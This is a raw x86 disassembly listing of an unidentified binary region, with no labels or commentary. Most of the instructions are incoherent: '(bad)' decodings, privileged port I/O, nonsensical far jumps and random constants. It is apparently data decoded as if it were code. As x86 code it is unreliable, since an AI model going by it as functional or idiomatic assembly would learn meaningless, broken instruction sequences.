  40f5a2:	cmp    BYTE PTR [esi+0x6b7044d0],dh
  40f5a8:	mov    esi,0x34a05f51
  40f5ad:	cmp    BYTE PTR [esi*4-0x5c5412f5],ch
  40f5b4:	gs pop eax
  40f5b6:	xchg   edi,eax
  40f5b7:	mov    al,0xce
  40f5b9:	push   esi
  40f5ba:	pand   mm1,QWORD PTR [edx+0x4d]
  40f5be:	sub    al,0x4f
  40f5c0:	clc    
  40f5c1:	cli    
  40f5c2:	retf   
  40f5c3:	and    BYTE PTR [esi+eiz*8-0x5e8bac26],0x76
  40f5cb:	aas    
  40f5cc:	stos   BYTE PTR es:[edi],al
  40f5cd:	xchg   edx,eax
  40f5ce:	mov    DWORD PTR [edx+0xb1b1dfa],eax
  40f5d4:	sbb    ebx,DWORD PTR [ebx-0x74]
  40f5d7:	cwde   
  40f5d8:	scas   al,BYTE PTR es:[edi]
  40f5d9:	(bad)  
  40f5da:	in     al,0x19
  40f5dc:	into   
  40f5dd:	daa    
  40f5de:	jg     0x40f64e
  40f5e0:	mov    ch,0x8d
  40f5e2:	sbb    edi,DWORD PTR [esi+ebx*4]
  40f5e5:	or     BYTE PTR [eax-0x4e],ah
  40f5e8:	fst    QWORD PTR [edi+0x46d60a9f]
  40f5ee:	imul   ebx,ebx,0xb935d87d
  40f5f4:	adc    DWORD PTR [edx+0x50],ebx
  40f5f7:	inc    esi
  40f5f8:	mov    dh,0x6d
  40f5fa:	ins    DWORD PTR es:[edi],dx
  40f5fb:	(bad)  [edi]
  40f5fd:	(bad)  
  40f5fe:	jmp    DWORD PTR [ebx]
  40f600:	fs call 0xa375:0x2fe9e023
  40f608:	sub    eax,0x5e82c6c5
  40f60d:	(bad)  
  40f60e:	stos   DWORD PTR es:[edi],eax
  40f60f:	jno    0x40f683
  40f611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f612:	ret    0xb040
  40f615:	dec    edi
  40f616:	push   esp
  40f617:	add    ah,ch
  40f619:	push   eax
  40f61a:	push   0x15
  40f61c:	fidivr DWORD PTR [esi+0x7d49bf4d]
  40f622:	jge    0x40f5d1
  40f624:	sub    edi,DWORD PTR [eax+0x34fb7fb5]
  40f62a:	xchg   esp,eax
  40f62b:	shl    DWORD PTR [edi+edx*4+0x6b],0x16
  40f630:	mov    dh,0x85
  40f632:	(bad)  
  40f633:	hlt    
  40f634:	xchg   esp,eax
  40f635:	sbb    DWORD PTR ds:0xb890e654,esp
  40f63b:	imul   BYTE PTR [edi+edx*1+0x16]
  40f63f:	and    DWORD PTR ss:[esi+0x37],edi
  40f643:	xor    ecx,DWORD PTR [edi+0x6f]
  40f646:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40f648:	and    DWORD PTR [eax+0x702d036d],ecx
  40f64e:	fsub   QWORD PTR [esi]
  40f650:	sub    BYTE PTR [edx],ch
  40f652:	push   0x6d6b744f
  40f657:	fwait
  40f658:	stos   BYTE PTR es:[edi],al
  40f659:	push   eax
  40f65a:	outs   dx,BYTE PTR cs:[esi]
  40f65c:	inc    eax
  40f65d:	xor    DWORD PTR [ebp-0x4],esp
  40f660:	stc    
  40f661:	jl     0x40f6d4
  40f663:	arpl   WORD PTR [ecx+0x3c791a7d],bp
  40f669:	push   ss
  40f66a:	mov    ecx,0x1ad680f
  40f66f:	sub    eax,0xf19adc2c
  40f674:	mov    ebp,0xed89d1a0
  40f679:	push   ebx
  40f67a:	fistp  DWORD PTR [ecx-0x3c]
  40f67d:	pop    edi
  40f67e:	bound  ebx,QWORD PTR [ecx-0x5d10eda3]
  40f684:	std    
  40f685:	test   al,0x6d
  40f687:	add    esi,ecx
  40f689:	lahf   
  40f68a:	jp     0x40f632
  40f68c:	in     eax,0xf8
  40f68e:	mov    ecx,0x7c0cdd15
  40f693:	mov    ebx,0x2064092a
  40f698:	add    bl,BYTE PTR [edi+0xb807dfb]
  40f69e:	pop    ebx
  40f69f:	push   edi
  40f6a0:	push   ebx
  40f6a1:	mov    DWORD PTR [ebp-0x1b],esi
  40f6a4:	pop    ss
  40f6a5:	xchg   edi,eax
  40f6a6:	jo     0x40f633
  40f6a8:	pop    esi
  40f6a9:	jbe    0x40f6ce
  40f6ab:	xor    BYTE PTR [ebp+0x23],al
  40f6ae:	inc    esi
  40f6af:	sub    al,0x14
  40f6b1:	mov    ecx,0xa0db46d7
  40f6b6:	in     eax,0x77
  40f6b8:	bound  edx,QWORD PTR ds:0x85dbe5ba
  40f6be:	lea    esp,ds:0xdd6691ad
  40f6c4:	sub    BYTE PTR [eax-0x18],al
  40f6c7:	mov    dh,0x45
  40f6c9:	sub    eax,0xa30a0834
  40f6ce:	pop    ds
  40f6cf:	jl     0x40f678
  40f6d1:	popa   
  40f6d2:	loope  0x40f696
  40f6d4:	mov    dh,0xdd
  40f6d6:	cdq    
  40f6d7:	add    eax,0x271d7042
  40f6dc:	sub    edi,DWORD PTR [edi]
  40f6de:	and    eax,0xe0db6dc5
  40f6e3:	sub    eax,0x3fad32ef
  40f6e8:	xor    DWORD PTR ds:0xb8826d7,0x4d
  40f6ef:	popa   
  40f6f0:	les    edx,FWORD PTR [edx-0x3f]
  40f6f3:	jmp    0x7ab9d35
  40f6f8:	lds    edi,FWORD PTR [ebx+0x2e1f934a]
  40f6fe:	test   BYTE PTR [eax-0x657f6bbb],ah
  40f704:	inc    esi
  40f705:	push   ebp
  40f706:	add    eax,0xe695b10a
  40f70b:	jge    0x40f742
  40f70d:	daa    
  40f70e:	xor    BYTE PTR [eax+0x22b70475],dh
  40f714:	jge    0x40f71a
  40f716:	fiadd  DWORD PTR [ebp+0x6d642c1a]
  40f71c:	jmp    0xed02b277
  40f721:	cdq    
  40f722:	xchg   edx,eax
  40f723:	inc    eax
  40f724:	push   cs
  40f725:	lds    eax,FWORD PTR ds:[edi+ecx*4]
  40f729:	ins    DWORD PTR es:[edi],dx
  40f72a:	sub    DWORD PTR [eax],0x11
  40f72d:	xchg   ebp,eax
  40f72e:	mov    cl,0xd8
  40f730:	mov    ecx,0x446b74a3
  40f735:	xchg   DWORD PTR [ebx-0x64],edx
  40f738:	jmp    0x6db7:0x45409302
  40f73f:	inc    esi
  40f740:	clc    
  40f741:	mov    ?,esi
  40f743:	inc    esp
  40f744:	mov    ds:0xd6e346d0,eax
  40f749:	xor    al,0x4
  40f74b:	bound  ecx,QWORD PTR [edx]
  40f74d:	cmp    cl,BYTE PTR [edi]
  40f74f:	cmp    DWORD PTR ds:0xd4476a3b,0xae6330cb
  40f759:	vhaddps xmm3,xmm7,XMMWORD PTR [edx]
  40f75d:	popa   
  40f75e:	fld    TBYTE PTR [edx+0x6d]
  40f761:	cmp    ecx,DWORD PTR [esp+edx*4]
  40f764:	and    dh,BYTE PTR [edi+0x8]
  40f767:	dec    esp
  40f768:	neg    edx
  40f76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f76b:	lods   eax,DWORD PTR ds:[esi]
  40f76c:	ins    DWORD PTR es:[edi],dx
  40f76d:	push   0x78d6fcdd
  40f772:	sbb    eax,0x533e68d2
  40f777:	adc    al,0x6c
  40f779:	fdiv   QWORD PTR [ebx+0x44691dab]
  40f77f:	(bad)  
  40f780:	fcmovnb st,st(2)
  40f782:	rol    BYTE PTR [edx+0x5d],cl
  40f785:	(bad)  
  40f786:	push   eax
  40f787:	dec    ebp
  40f788:	lea    esi,[ecx]
  40f78a:	pop    ecx
  40f78b:	xor    ah,BYTE PTR ds:0xb46d6e14
  40f791:	inc    ebx
  40f792:	bound  esi,QWORD PTR [edi-0x391efe56]
  40f798:	fild   WORD PTR ds:0xa2c2c2c
  40f79e:	push   0xffffffac
  40f7a0:	xor    BYTE PTR [esi-0x60],bl
  40f7a3:	mov    dh,0x76
  40f7a5:	popa   
  40f7a6:	mov    eax,ds:0x64f20d3c
  40f7ab:	into   
  40f7ac:	jb     0x40f7a3
  40f7ae:	mov    ecx,0xb41b6c68
  40f7b3:	add    BYTE PTR [edx-0x51635f5],bl
  40f7b9:	ss inc ebp
  40f7bb:	fdiv   QWORD PTR [edx]
  40f7bd:	xor    al,0x6a
  40f7bf:	mov    dh,0x71
  40f7c1:	imul   esi,DWORD PTR [edi+edi*2+0x17],0x4c001a36
  40f7c9:	xchg   ecx,eax
  40f7ca:	mov    ebp,0xe014611c
  40f7cf:	ins    DWORD PTR es:[edi],dx
  40f7d0:	imul   ebx,ebx,0x5a
  40f7d3:	sbb    al,0xda
  40f7d5:	pop    edi
  40f7d6:	loopne 0x40f7b4
  40f7d8:	xchg   esp,eax
  40f7d9:	imul   DWORD PTR [ebp-0x49f72b4e]
  40f7df:	iret   
  40f7e0:	inc    esp
  40f7e1:	popw   ds
  40f7e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e4:	push   edx
  40f7e5:	sbb    bh,BYTE PTR [ebx]
  40f7e7:	mov    bl,bl
  40f7e9:	adc    cl,0x36
  40f7ec:	scas   eax,DWORD PTR es:[edi]
  40f7ed:	pop    ecx
  40f7ee:	jg     0x40f7ff
  40f7f0:	jle    0x40f84a
  40f7f2:	fcomp  st(2)
  40f7f4:	push   ss
  40f7f5:	push   ebp
  40f7f6:	add    DWORD PTR [ebx+0x7e],edx
  40f7f9:	loop   0x40f7aa
  40f7fb:	cmp    bl,BYTE PTR [edx+0x46]
  40f7fe:	inc    edi
  40f7ff:	fcomp  QWORD PTR [eax-0x4b]
  40f802:	(bad)  
  40f803:	jb     0x40f831
  40f805:	push   esp
  40f806:	mov    esp,0x7db8098e
  40f80b:	inc    esp
  40f80c:	fisttp DWORD PTR [ecx+0x35]
  40f80f:	adc    bl,BYTE PTR [ebp-0x6a]
  40f812:	repnz pop esp
  40f814:	mov    DWORD PTR [eax-0x2ca93d25],eax
  40f81a:	ds in  eax,0x7f
  40f81d:	cmp    al,0x20
  40f81f:	mov    cl,0x8c
  40f821:	add    BYTE PTR [esi+0x1858a680],dh
  40f827:	nop
  40f828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f829:	fisub  DWORD PTR [ebp-0x7d4144e6]
  40f82f:	mov    eax,ds:0xac151e36
  40f834:	es mov ebx,0xc1163699
  40f83a:	sahf   
  40f83b:	sub    eax,0x3d2929bf
  40f840:	scas   al,BYTE PTR es:[edi]
  40f841:	mov    ecx,0x5b6c2e17
  40f846:	aam    0x67
  40f848:	mov    esp,0x370d041d
  40f84d:	test   DWORD PTR [esi],edi
  40f84f:	add    cl,dl
  40f851:	ins    DWORD PTR es:[edi],dx
  40f852:	imul   ecx,ebx,0xffffffc5
  40f855:	in     eax,dx
  40f856:	fs push esi
  40f858:	mov    ecx,0x4d95236c
  40f85d:	mov    dh,0x4b
  40f85f:	test   DWORD PTR [ebp-0x7a],ecx
  40f862:	mov    dh,0xca
  40f864:	std    
  40f865:	cmp    bh,0x50
  40f868:	pop    esp
  40f869:	sbb    BYTE PTR [ebp-0x672f4913],al
  40f86f:	scas   eax,DWORD PTR es:[edi]
  40f870:	ror    DWORD PTR [ecx+ebp*8+0x31dff8db],1
  40f877:	sub    eax,0x760b0b44
  40f87c:	cmc    
  40f87d:	inc    ebx
  40f87e:	push   eax
  40f87f:	loop   0x40f81d
  40f881:	in     al,dx
  40f882:	mov    cl,BYTE PTR [ebp+0x11]
  40f885:	mov    ch,0x79
  40f887:	push   0x57
  40f889:	pushf  
  40f88a:	into   
  40f88b:	mov    dl,0xb0
  40f88d:	rol    DWORD PTR [eax-0x6],1
  40f890:	repz cmp al,0x63
  40f893:	(bad)  
  40f895:	push   0xb6e28ba9
  40f89a:	ror    DWORD PTR [ebx-0x52c5e895],cl
  40f8a0:	adc    al,0xb5
  40f8a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a3:	mov    esp,0x86aaf84e
  40f8a8:	fild   DWORD PTR [esi-0x5]
  40f8ab:	rcr    DWORD PTR [ebp+0x22],0x9e
  40f8af:	lahf   
  40f8b0:	mov    ebx,0x44b5ae56
  40f8b5:	data16 mov ah,0x81
  40f8b8:	cs ins BYTE PTR es:[edi],dx
  40f8ba:	sbb    eax,0xe181463d
  40f8bf:	or     eax,DWORD PTR [eax+0x6d6c2e20]
  40f8c5:	adc    ebp,DWORD PTR [edi+0x32]
  40f8c8:	cmp    esi,DWORD PTR [edi+0x62]
  40f8cb:	push   eax
  40f8cc:	add    DWORD PTR [ebx+0x6c14d69f],esp
  40f8d2:	xor    bl,0x8a
  40f8d5:	sbb    BYTE PTR [edx+eax*2+0xb50d4d4],0xd4
  40f8dd:	xchg   esi,eax
  40f8de:	imul   esp,DWORD PTR ds:0xa9761ba6,0xb4ddb803
  40f8e8:	xor    al,0xf8
  40f8ea:	scas   al,BYTE PTR es:[edi]
  40f8eb:	jge    0x40f8dd
  40f8ed:	shr    BYTE PTR [esi-0x28],cl
  40f8f0:	xor    BYTE PTR [eax],0xd4
  40f8f3:	or     al,0xfa
  40f8f5:	and    ebx,DWORD PTR [eax+0x76]
  40f8f8:	mov    ds:0x165b585d,eax
  40f8fd:	dec    edi
  40f8fe:	pop    ecx
  40f8ff:	or     bl,cl
  40f901:	push   ecx
  40f902:	gs mov bl,0xc5
  40f905:	sbb    edx,0x778b85b6
  40f90b:	adc    al,0x7e
  40f90d:	retf   
  40f90e:	and    DWORD PTR [ebx+eax*1],esp
  40f911:	rol    DWORD PTR [esi+0x306aa668],0x85
  40f918:	repnz fistp DWORD PTR [edx]
  40f91b:	loopne 0x40f963
  40f91d:	std    
  40f91e:	and    al,0x22
  40f920:	push   0x41501c70
  40f925:	ja     0x40f8dd
  40f927:	ins    DWORD PTR es:[edi],dx
  40f928:	xor    DWORD PTR [esi+0x68],0xfffffff0
  40f92c:	(bad)  
  40f92d:	dec    ebp
  40f92e:	xor    DWORD PTR [edx+0x44],ecx
  40f931:	outs   dx,BYTE PTR ds:[esi]
  40f932:	lods   eax,DWORD PTR ds:[esi]
  40f933:	pop    edx
  40f934:	pop    edx
  40f935:	sub    BYTE PTR [edi],dh
  40f937:	dec    ebx
  40f938:	sbb    dl,BYTE PTR [esi+0x13]
  40f93b:	pusha  
  40f93c:	outs   dx,BYTE PTR ds:[esi]
  40f93d:	xor    eax,esp
  40f93f:	push   es
  40f940:	push   0xd4d5f7a3
  40f945:	xor    DWORD PTR [edi+0x175b0b82],0x6d0e9aea
  40f94f:	mov    dl,0xdb
  40f951:	cmp    DWORD PTR [ecx-0x25],esp
  40f954:	fdivr  DWORD PTR [edx-0x66254044]
  40f95a:	fdiv   DWORD PTR [edi]
  40f95c:	adc    DWORD PTR [eax],esi
  40f95e:	fsub   DWORD PTR fs:[eax+0x1]
  40f962:	pusha  
  40f963:	cmp    edi,DWORD PTR [edx]
  40f965:	mov    edi,0xb06da983
  40f96a:	aam    0xda
  40f96c:	pop    edx
  40f96d:	xchg   edi,eax
  40f96e:	icebp  
  40f96f:	adc    DWORD PTR [ecx+eiz*4-0x5b],0xffffffff
  40f974:	pop    ebx
  40f975:	pop    ebx
  40f976:	mov    ebx,0x95f6b168
  40f97b:	out    dx,eax
  40f97c:	adc    BYTE PTR [ecx-0x9],cl
  40f97f:	in     al,dx
  40f980:	add    BYTE PTR [ecx],al
  40f982:	int3   
  40f983:	add    BYTE PTR [edi-0x1ae4ff22],ch
  40f989:	pop    ss
  40f98a:	xchg   esi,eax
  40f98b:	mov    bl,0x8b
  40f98d:	mov    ss,WORD PTR [esp+eax*2+0x0]
  40f991:	stc    
  40f992:	mov    edx,0xb46efcae
  40f997:	sbb    ecx,DWORD PTR [ebx]
  40f999:	mov    esi,0x6bf4dea0
  40f99e:	(bad)
  40f9a1:	in     eax,dx
  40f9a2:	sub    BYTE PTR [edi+0x1329d0b0],bh
  40f9a8:	(bad)  
  40f9aa:	dec    esp
  40f9ab:	cdq    
  40f9ac:	add    al,bl
  40f9ae:	push   cs
  40f9af:	mov    dh,0x6a
  40f9b1:	mov    eax,ds:0x4b2d255d
  40f9b6:	adc    al,0xf1
  40f9b8:	mov    al,0x5e
  40f9ba:	arpl   ax,ax
  40f9bc:	mov    dh,0xb0
  40f9be:	aam    0xb6
  40f9c0:	mov    edi,0xa76a01c4
  40f9c5:	jo     0x40f97d
  40f9c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9c8:	(bad)  [esi-0x21d0f9b8]
  40f9ce:	es pusha 
  40f9d0:	pop    esp
  40f9d1:	xor    ch,BYTE PTR [edx]
  40f9d3:	outs   dx,BYTE PTR ds:[esi]
  40f9d4:	pop    ds
  40f9d5:	mov    dh,0xb
  40f9d7:	outs   dx,BYTE PTR ds:[esi]
  40f9d8:	adc    al,0x1c
  40f9da:	int3   
  40f9db:	rcl    DWORD PTR [esi+0x4f],1
  40f9de:	inc    edx
  40f9df:	std    
  40f9e0:	sbb    bl,BYTE PTR [ebx+0x58]
  40f9e3:	fcmovu st,st(2)
  40f9e5:	inc    edx
  40f9e6:	cwde   
  40f9e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9e8:	stc    
  40f9e9:	pop    ss
  40f9ea:	out    0x46,al
  40f9ec:	out    dx,eax
  40f9ed:	sub    DWORD PTR [ebp-0x25],0xffffffda
  40f9f1:	jbe    0x40fa2a
  40f9f3:	and    DWORD PTR [edi+0x60],esi
  40f9f6:	xlat   BYTE PTR ds:[ebx]
  40f9f7:	sahf   
  40f9f8:	cwde   
  40f9f9:	or     ebx,DWORD PTR [edx-0x4d]
  40f9fc:	mov    dh,0x85
  40f9fe:	mov    dl,0xc4
  40fa00:	mov    edx,0x3a35c41e
  40fa05:	xor    al,0x7a
  40fa07:	pop    esi
  40fa08:	test   DWORD PTR [ebp-0x379248a],ecx
  40fa0e:	adc    al,0xb5
  40fa10:	mov    ecx,0xf7f2c932
  40fa15:	mov    BYTE PTR [ebp+0x17],ch
  40fa18:	(bad)
  40fa1b:	mov    al,ds:0x83f80983
  40fa20:	in     eax,dx
  40fa21:	push   edx
  40fa22:	mov    DWORD PTR [eax-0x6a],ebp
  40fa25:	xchg   ebx,eax
  40fa26:	sbb    eax,0x74ce0e17
  40fa2b:	push   esp
  40fa2c:	ror    BYTE PTR [esi-0x1e5c3978],1
  40fa32:	dec    ebx
  40fa33:	jmp    0x7b4:0x1edb52c6
  40fa3a:	outs   dx,BYTE PTR ds:[esi]
  40fa3b:	add    ch,BYTE PTR [eax-0x52]
  40fa3e:	pop    es
  40fa3f:	out    dx,eax
  40fa40:	add    dh,BYTE PTR [edi+0x21a506da]
  40fa46:	jne    0x40fa8f
  40fa48:	cli    
  40fa49:	sub    edi,DWORD PTR ds:0xb71135ea
  40fa4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa50:	mov    esp,0xc5bea411
  40fa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa56:	jp     0x40fa1a
  40fa58:	(bad)  
  40fa59:	mov    dh,0xb1
  40fa5b:	xchg   BYTE PTR [edi],bh
  40fa5d:	daa    
  40fa5e:	lahf   
  40fa5f:	pop    ecx
  40fa60:	xchg   ecx,eax
  40fa61:	inc    ebp
  40fa62:	fist   WORD PTR [edx+0x6d]
  40fa65:	imul   edx,DWORD PTR ds:0xd49259ed,0x3
  40fa6c:	je     0x40fa0d
  40fa6e:	push   cs
  40fa6f:	loopne 0x40fa27
  40fa71:	cdq    
  40fa72:	mov    dh,0x1f
  40fa74:	pop    ss
  40fa75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa76:	(bad)  
  40fa77:	ja     0x40fae9
  40fa79:	pop    ecx
  40fa7a:	nop
  40fa7b:	jae    0x40fa0a
  40fa7d:	sbb    eax,0xc7032ec0
  40fa82:	(bad)  
  40fa83:	pop    edi
  40fa84:	push   ss
  40fa85:	jbe    0x40fa23
  40fa87:	mov    bh,0x8d
  40fa89:	out    0x46,eax
  40fa8b:	xor    al,0x56
  40fa8d:	and    DWORD PTR [eax-0x30a6ebaf],edx
  40fa93:	in     al,dx
  40fa94:	or     esi,DWORD PTR [ebp+ebp*8+0xd06a817]
  40fa9b:	jno    0x40fa39
  40fa9d:	push   eax
  40fa9e:	mov    ebp,0xfcbb4139
  40faa3:	test   esp,edi
  40faa5:	push   edx
  40faa6:	mov    edi,0xdec500
  40faab:	stos   DWORD PTR es:[edi],eax
  40faac:	sbb    BYTE PTR [eax+0x29],bh
  40faaf:	push   ss
  40fab0:	mov    dh,0xba
  40fab2:	mov    ah,0xbf
  40fab4:	pop    ebx
  40fab5:	sub    DWORD PTR [ecx],ecx
  40fab7:	mov    esi,DWORD PTR [ebx+0x6d558e58]
  40fabd:	pop    esp
  40fabe:	pop    esi
  40fabf:	fsubr  DWORD PTR [edi]
  40fac1:	push   ds
  40fac2:	int    0x24
  40fac4:	add    BYTE PTR [ebx],dl
  40fac6:	js     0x40fa4f
  40fac8:	pushf  
  40fac9:	mov    ds:0x75ba7c6,eax
  40face:	aaa    
  40facf:	cmp    ebp,DWORD PTR [ecx]
  40fad1:	sub    al,0xb2
  40fad3:	mov    bl,0x58
  40fad5:	(bad)  
  40fad7:	ins    DWORD PTR es:[edi],dx
  40fad8:	popa   
  40fad9:	imul   ecx,ebx,0xfffffffe
  40fadc:	pop    ss
  40fadd:	inc    esp
  40fade:	sti    
  40fadf:	out    0x73,eax
  40fae1:	adc    ah,al
  40fae3:	pop    eax
  40fae4:	sub    ah,bl
  40fae6:	mov    dh,0x5a
  40fae8:	sahf   
  40fae9:	inc    ecx
  40faea:	push   ebx
  40faeb:	add    dl,BYTE PTR [edx-0x45]
  40faee:	les    esp,FWORD PTR [ebp+0x76]
  40faf1:	popa   
  40faf2:	popa   
  40faf3:	fcmovnb st,st(6)
  40faf5:	jbe    0x40fa7a
  40faf7:	mov    ds:0x3082ea55,eax
  40fafc:	mov    edx,0x370135d4
  40fb01:	mov    dh,0x7d
  40fb03:	adc    BYTE PTR ds:0x240acf53,dl
  40fb09:	bound  esp,QWORD PTR [ebx+0x31e6b5d6]
  40fb0f:	sbb    edi,esp
  40fb11:	pop    esp
  40fb12:	hlt    
  40fb13:	mov    esp,0x5b4406d
  40fb18:	sbb    DWORD PTR [edi-0x249dfa83],ebx
  40fb1e:	push   ss
  40fb1f:	mov    dh,0xad
  40fb21:	dec    ebp
  40fb22:	imul   eax,DWORD PTR [edi],0x38
  40fb25:	dec    ecx
  40fb26:	xor    edx,eax
  40fb28:	retf   
  40fb29:	xchg   edi,eax
  40fb2a:	enter  0x6371,0x8b
  40fb2e:	ins    DWORD PTR es:[edi],dx
  40fb2f:	aaa    
  40fb30:	das    
  40fb31:	or     al,0x12
  40fb33:	mov    DWORD PTR [ebx-0x7a],edi
  40fb36:	(bad)  cs:[esi+0xda93db1]
  40fb3d:	or     ch,ah
  40fb3f:	iret   
  40fb40:	dec    ebx
  40fb41:	or     DWORD PTR [ebp+0x29],0x6f
  40fb45:	lods   eax,DWORD PTR ds:[esi]
  40fb46:	adc    dh,BYTE PTR [eax-0x710b14b]
  40fb4c:	shl    BYTE PTR [ebx-0x54],0x68
  40fb50:	xchg   edi,eax
  40fb51:	ss mov dh,0xb
  40fb54:	cmc    
  40fb55:	cmp    al,0x9c
  40fb57:	inc    esi
  40fb58:	clc    
  40fb59:	lock call 0x2a4667dc
  40fb5f:	pop    ebp
  40fb60:	mov    esi,0x686203f7
  40fb65:	repnz retf 0x5bb5
  40fb69:	mov    ebx,0x6e91e82d
  40fb6e:	inc    edi
  40fb6f:	fwait
  40fb70:	xlat   BYTE PTR ds:[ebx]
  40fb71:	dec    edx
  40fb72:	mov    esp,0xa96bc2d9
  40fb77:	push   ecx
  40fb78:	mov    cl,0x6b
  40fb7a:	xor    al,BYTE PTR [edx]
  40fb7c:	lds    esp,FWORD PTR [eax+0x40]
  40fb7f:	adc    bl,bl
  40fb81:	ins    DWORD PTR es:[edi],dx
  40fb82:	imul   esp,DWORD PTR [edi],0x4bce75d1
  40fb88:	jae    0x40fb52
  40fb8a:	adc    BYTE PTR [eax+0x41],ch
  40fb8d:	mov    ah,0xd
  40fb8f:	pop    edx
  40fb90:	enter  0x1a22,0x7b
  40fb94:	mov    bh,0xc2
  40fb96:	mov    dh,0x5d
  40fb98:	mov    esi,DWORD PTR [ecx-0x7fd98b28]
  40fb9e:	mov    BYTE PTR [eax+0x44],dh
  40fba1:	mov    ah,0xb1
  40fba3:	fisubr DWORD PTR [ebp-0x25]
  40fba6:	sbb    bh,BYTE PTR [esi-0x35]
  40fba9:	enter  0xde05,0x83
  40fbad:	aam    0x9
  40fbaf:	sbb    eax,0xdada2363
  40fbb4:	pop    esp
  40fbb5:	das    
  40fbb6:	xchg   edi,eax
  40fbb7:	addr16 int3 
  40fbb9:	add    DWORD PTR [esi+0x6d],ecx
  40fbbc:	pop    ebx
  40fbbd:	or     ebx,DWORD PTR [ebx-0x74]
  40fbc0:	je     0x40fb71
  40fbc2:	(bad)  
  40fbc3:	fild   WORD PTR [ebx+0x50]
  40fbc6:	or     ebp,DWORD PTR ds:0xbe6ebf6c
  40fbcc:	leave  
  40fbcd:	rol    DWORD PTR [ebp+0x6fce1c35],1
  40fbd3:	jg     0x40fc1d
  40fbd5:	mov    ecx,0xc200d4b1
  40fbda:	mov    eax,ebp
  40fbdc:	jecxz  0x40fbde
  40fbde:	pop    eax
  40fbdf:	ret    
  40fbe0:	ret    0xc2c6
  40fbe3:	inc    edx
  40fbe4:	jl     0x40fc24
  40fbe6:	cmp    bl,BYTE PTR [edx+0x6f]
  40fbe9:	in     eax,dx
  40fbea:	rcr    ebx,cl
  40fbec:	mov    dh,0xb1
  40fbee:	rol    DWORD PTR [esi],0x4d
  40fbf1:	out    dx,al
  40fbf2:	pusha  
  40fbf3:	ins    BYTE PTR es:[edi],dx
  40fbf4:	ja     0x40fc59
  40fbf6:	pop    esp
  40fbf7:	mov    dl,0xab
  40fbf9:	fidivr DWORD PTR [esi]
  40fbfb:	mov    dh,0xea
  40fbfd:	jge    0x40fbce
  40fbff:	xor    BYTE PTR [eax+0x47],cl
  40fc02:	bound  ebp,QWORD PTR es:0xde6d5bb4
  40fc09:	inc    esp
  40fc0a:	pop    ds
  40fc0b:	xchg   ebp,eax
  40fc0c:	pop    edi
  40fc0d:	xlat   BYTE PTR ds:[ebx]
  40fc0e:	xor    BYTE PTR [ebx-0x492493fa],0x11
  40fc15:	(bad)  
  40fc16:	ja     0x40fc8b
  40fc18:	cmp    BYTE PTR [edi-0x2784d5cb],dl
  40fc1e:	pop    eax
  40fc1f:	fidiv  DWORD PTR [esi-0x7e22786]
  40fc25:	push   ebx
  40fc26:	mov    ds:0x58db872d,eax
  40fc2b:	pop    eax
  40fc2c:	pop    edx
  40fc2d:	sub    BYTE PTR [esi+ecx*1],al
  40fc30:	and    eax,0xe509a61c
  40fc35:	outs   dx,BYTE PTR ds:[esi]
  40fc36:	sbb    eax,0x1f6d8dc4
  40fc3b:	dec    edx
  40fc3c:	out    0x3,eax
  40fc3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc3f:	(bad)  
  40fc40:	fidiv  WORD PTR [edi-0x4a44949b]
  40fc46:	lds    edi,FWORD PTR [edx+esi*1-0x7b674c34]
  40fc4d:	call   0xcbb14201
  40fc52:	ins    DWORD PTR es:[edi],dx
  40fc53:	xor    eax,0x224f0226
  40fc58:	xchg   BYTE PTR [ecx-0x5b2924b5],ah
  40fc5e:	inc    esp
  40fc5f:	pop    ecx
  40fc60:	sub    al,0x7a
  40fc62:	iret   
  40fc63:	sub    DWORD PTR [edi+ebp*8-0x7d],ebx
  40fc67:	add    DWORD PTR [edi+0x266bed8d],esi
  40fc6d:	pop    esp
  40fc6e:	mov    ds:0x20244d82,al
  40fc73:	dec    ebx
  40fc74:	in     eax,dx
  40fc75:	add    bl,BYTE PTR [ebp-0x73]
  40fc78:	pusha  
  40fc79:	ret    
  40fc7a:	dec    esi
  40fc7b:	(bad)  
  40fc7c:	cmp    eax,DWORD PTR [edx]
  40fc7e:	aas    
  40fc7f:	mov    ebx,0x5ea2b951
  40fc84:	mov    al,ds:0xc2cbf46d
  40fc89:	sub    BYTE PTR [esi+0x6d],0x61
  40fc8d:	mov    ?,WORD PTR [edi]
  40fc8f:	jno    0x40fc1a
  40fc91:	es nop
  40fc93:	lea    ebp,[ebp+0x17]
  40fc96:	mov    dh,0x86
  40fc98:	cmp    ebx,DWORD PTR [esi+0x11]
  40fc9b:	sbb    DWORD PTR [ebx+0x16],0xffffffdc
  40fc9f:	xchg   ebp,eax
  40fca0:	cmp    DWORD PTR [esi+0x1b],ebp
  40fca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fca4:	mov    al,ds:0x8f45059b
  40fca9:	mov    edi,0xdadb0405
  40fcae:	lods   eax,DWORD PTR ds:[esi]
  40fcaf:	test   eax,0xc9fb443b
  40fcb4:	cwde   
  40fcb5:	add    dh,BYTE PTR [edi+esi*4-0x4a]
  40fcb9:	arpl   WORD PTR [ecx-0x7f],bp
  40fcbc:	ins    DWORD PTR es:[edi],dx
  40fcbd:	fcom   QWORD PTR [edi]
  40fcbf:	ds fcmovnbe st,st(3)
  40fcc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc3:	jmp    0x40fcb5
  40fcc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcc6:	pop    esp
  40fcc7:	shl    BYTE PTR [esi-0x77],0xd8
  40fccb:	mov    ecx,0xa8092177
  40fcd0:	fnsave [esi-0x66758273]
  40fcd6:	outs   dx,BYTE PTR ds:[esi]
  40fcd7:	push   ecx
  40fcd8:	inc    esp
  40fcd9:	sbb    eax,0xb8086565
  40fcde:	ins    DWORD PTR es:[edi],dx
